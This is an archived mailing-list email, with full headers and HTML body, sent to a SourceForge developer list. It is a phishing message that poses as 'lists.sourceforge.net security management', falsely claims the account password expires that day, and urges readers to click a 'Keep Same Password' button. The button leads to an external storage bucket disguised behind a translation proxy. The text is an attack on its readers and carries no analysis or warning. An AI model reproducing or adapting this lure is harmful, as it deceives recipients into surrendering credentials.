Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 02DA65124D1
	for <lists+industrypack-devel@lfdr.de>; Wed, 27 Apr 2022 23:54:23 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1njpc7-0000M9-1U
	for lists+industrypack-devel@lfdr.de; Wed, 27 Apr 2022 21:54:21 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <donotreply@webs.com>) id 1njpc5-0000M2-4w
 for industrypack-devel@lists.sourceforge.net; Wed, 27 Apr 2022 21:54:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=IT6OxIzjE+09jijDIxZz+WP5wGHo1AFqLLYKsm0Yknc=; b=VBVxvBhaUfHmSch6yh89CR6cz8
 03AwgvHnigrmdslR6pNlHcgVMich+geV47f2A2Nc72sFrh1qTRW9uY9ZkLoo5JQDAcajzTtVahWIZ
 lrwPzgNF5fRnosP5hBiMMqG9DrpaypU7wxyTiU6GbUhdHEh857oRgdHL0YwzlWqIIa5U=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=IT6OxIzjE+09jijDIxZz+WP5wGHo1AFqLLYKsm0Yknc=; b=j
 3PXmulqxccZNFZpC+3pB0ufFGKonqtYrxDHbhBjn6GA5C/NjAgc5H8nOdhrE40ieClHOJE54YHpS/
 xS0njdZnCliAwu+uK2UicZX95oPTXeUdfB+XFhyoBZlICe2FFv5casZObS8x0ygdZU7ntPkdadt/I
 1wVQiTb3KDEGfXcc=;
Received: from [103.238.213.81] (helo=webs.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.94.2)
 id 1njpc1-00C5o1-Gi
 for industrypack-devel@lists.sourceforge.net; Wed, 27 Apr 2022 21:54:19 +0000
Received: from [46.183.220.32] (account donotreply@webs.com HELO webs.com)
 by webs.com (CommuniGate Pro SMTP 6.2.14 _community_)
 with ESMTPSA id 2425618 for industrypack-devel@lists.sourceforge.net;
 Thu, 28 Apr 2022 00:54:06 +0300
To: industrypack-devel@lists.sourceforge.net
Date: 28 Apr 2022 00:54:06 +0300
Message-ID: <20220428005406.96D8FD99DB98ECD4@webs.com>
MIME-Version: 1.0
X-Spam-Score: 4.4 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Your account industrypack-devel@lists.sourceforge.net
 password
 expires today 28/04/2022 Please kindly use the button below to continue with
 the same password. Keep Same Password Hide original message 
 Content analysis details:   (4.4 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.org/Why?s=mfrom;
 id=donotreply%40webs.com; ip=103.238.213.81;
 r=util-spamd-2.v13.lw.sourceforge.com]
 0.0 SPF_HELO_FAIL          SPF: HELO does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.org/Why?s=helo; id=webs.com;
 ip=103.238.213.81; r=util-spamd-2.v13.lw.sourceforge.com]
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 1.4 FSL_BULK_SIG           Bulk signature with no Unsubscribe
X-Headers-End: 1njpc1-00C5o1-Gi
Subject: [Industrypack-devel] Helpdesk@lists.sourceforge.net: Password Reset
 !!!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net Mail Notification via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net Mail Notification" <donotreply@webs.com>
Content-Type: multipart/mixed; boundary="===============2502006753339330970=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2502006753339330970==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META content=3D"text/html; charset=3Diso-8859-1" http-equiv=3DContent-Type=
>
<STYLE type=3Dtext/css>
<!--
=2Estyle3 {color: #FFFFFF}
-->
</STYLE>

<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18817"></HEAD>
<BODY>
<P align=3Dcenter>Your account industrypack-devel@lists.sourceforge.net pas=
sword expires today <FONT color=3D#fa0505><STRONG>28/04/2022</STRONG></FONT=
> <BR></P>
<P align=3Dcenter>Please kindly use the button below to continue with the s=
ame password.<BR><BR><BR><BR>
<TABLE role=3Dmodule class=3Dmodule style=3D"TABLE-LAYOUT: fixed" cellSpaci=
ng=3D0 cellPadding=3D0 width=3D"100%" border=3D0 data-muid=3D"95a42fb0-070c=
-40a1-9170-10abe9a03ee5" data-type=3D"button" data-role=3D"module-button">
<TBODY>
<TR>
<TD class=3Douter-td style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dcenter>
<TABLE class=3Dwrapper-mobile style=3D"TEXT-ALIGN: center" cellSpacing=3D0 =
cellPadding=3D0 border=3D0>
<TBODY>
<TR>
<TD class=3Dinner-td style=3D"FONT-SIZE: 16px; TEXT-ALIGN: left; border-rad=
ius: 6px" bgColor=3D#0073f0 align=3Dcenter>
<A style=3D"FONT-SIZE: 14px; TEXT-DECORATION: none; BORDER-TOP: #0073ff 1px=
 solid; BORDER-RIGHT: #0073ff 1px solid; WIDTH: 216px; BORDER-BOTTOM: #0073=
ff 1px solid; FONT-WEIGHT: normal; COLOR: #ffffff; PADDING-BOTTOM: 12px; TE=
XT-ALIGN: center; PADDING-TOP: 12px; PADDING-LEFT: 18px; BORDER-LEFT: #0073=
ff 1px solid; DISPLAY: inline-block; LETTER-SPACING: 0px; LINE-HEIGHT: 27px=
; PADDING-RIGHT: 18px; BACKGROUND-COLOR: #0073ff; border-radius: 6px"=20
href=3D"https://storageapi-fleek-co.translate.goog/a3f5e62b-1981-4c8a-990a-=
af09f15e8d5f-bucket/cmp2-866aelv1/ta.html?_x_tr_sl=3Dauto&_x_tr_tl=3Den&_x_=
tr_hl=3Den-US&#industrypack-devel@lists.sourceforge.net" target=3D_blank>Ke=
ep Same Password</A></A> </TD></TR></TBODY></TABLE><BR></TD></TR></TBODY></=
TABLE>

Hide original message
<TABLE role=3Dmodule class=3Dmodule style=3D"TABLE-LAYOUT: fixed" cellSpaci=
ng=3D0 cellPadding=3D0 width=3D"100%" border=3D0 data-muid=3D"8f88f462-b4fd=
-4cb9-97f7-9538a8b71d90" data-type=3D"text" data-mc-module-version=3D"2019-=
10-22">
<TBODY>
<TR><BR>
<CENTER><FONT face=3D"Segoe UI"><FONT size=3D2><BR>NOTE: This is a one time=
 user verification carried out to shutdown robot&nbsp;of malicious users an=
d other fraudulent activities. </FONT>
<P align=3Dcenter><FONT size=3D2>&nbsp;Copyright &copy; 2022 lists.sourcefo=
rge.net security management</FONT></P></FONT></CENTER></TR></TBODY>
<P></P>
<P></P>
<P></P>
<P></P>
<P></P>
<P></P>
<P></P>
<P></P>
<P></P></P></BODY></HTML>


--===============2502006753339330970==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2502006753339330970==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2502006753339330970==--
